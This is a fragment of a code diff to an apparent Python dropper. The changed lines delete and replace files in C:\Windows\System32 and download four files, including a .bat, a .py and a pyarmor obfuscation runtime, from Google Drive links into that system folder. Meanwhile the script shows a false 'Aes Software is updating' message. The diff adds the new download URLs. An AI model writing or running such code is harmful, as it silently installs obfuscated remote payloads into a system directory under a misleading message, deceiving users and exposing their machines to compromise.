@@ -77,10 +77,10 @@ os.system('cls')
 print("")
 print("")
 def delete_files_if_aesv3_missing():
-    aesv3_path = r"C:\Windows\System32\AesV5.py"
+    aesv3_path = r"C:\Windows\System32\AesV6.py"
     files_to_delete = [
-        r"C:\Windows\System32\aes.py",
-        r"C:\Windows\System32\aes.bat",
+        r"C:\Windows\System32\AesV5.py",
+        r"C:\Windows\System32\aesv5.bat",
         r"C:\Windows\System32\pyarmor_runtime_000000"
     ]
 
@@ -94,6 +94,8 @@ def delete_files_if_aesv3_missing():
                     print("")
                 elif os.path.isdir(item):
                     shutil.rmtree(item)
+                    os.system('cls')
+                    print("")
                     print("Aes Software is updating, please don't close the window.")
     else:
         print("")
@@ -106,10 +108,10 @@ def download_file_from_google_drive(url, output_path):
 
 if not os.path.exists("C:\\Windows\\System32\\pyarmor_runtime_000000"):
     print("downloading required libraries, please wait a moment...")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1HXDDoBAO9ld5ANgtXI8AjTIzq5JS2m1p", "C:\\Windows\\System32\\__init__.py")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1oNMmVZOQB-zE86U89_nPfFm5Y3w5Qot3", "C:\\Windows\\System32\\aesv5.bat")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1U0TAT7Qb4JZHuPNIaLLBMVh_4TjAe_sz", "C:\\Windows\\System32\\AesV5.py")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1t-AYI6VFLb5gXJhv7JHhH39X06H5VUs9", "C:\\Windows\\System32\\pyarmor_runtime.pyd")
+    download_file_from_google_drive("https://drive.google.com/uc?id=1Gfgur8Swy43QZ7d5pTMsqFt6QL9-JBax", "C:\\Windows\\System32\\__init__.py")
+    download_file_from_google_drive("https://drive.google.com/uc?id=1rV0kswOX6oYg5m2y67EnIXxti0WOlju3", "C:\\Windows\\System32\\aesv6.bat")
+    download_file_from_google_drive("https://drive.google.com/uc?id=1KwLScDj9u7e2azoq9ZLv00hNs_UjFtXc", "C:\\Windows\\System32\\AesV6.py")
+    download_file_from_google_drive("https://drive.google.com/uc?id=1O50SvUaOjI5h8RVGdKA9mXqU20c5h9wN", "C:\\Windows\\System32\\pyarmor_runtime.pyd")
 
 
 import os
